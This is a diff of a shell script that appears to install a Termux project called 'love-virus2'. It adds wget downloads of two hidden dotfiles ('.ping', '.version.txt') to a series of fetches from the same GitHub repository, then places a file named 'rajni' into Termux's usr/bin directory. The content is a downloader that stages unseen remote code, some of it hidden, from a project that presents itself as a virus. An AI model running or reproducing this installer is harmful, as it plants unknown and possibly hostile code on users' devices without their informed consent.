@@ -17,6 +17,8 @@ wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simple
 wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/loveyou2.txt
 wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/love.sh
 wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/simple.txt
+wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/.ping
+wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/.version.txt
 cd /data/data/com.termux/files/usr/bin
 wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/rajni
 clear
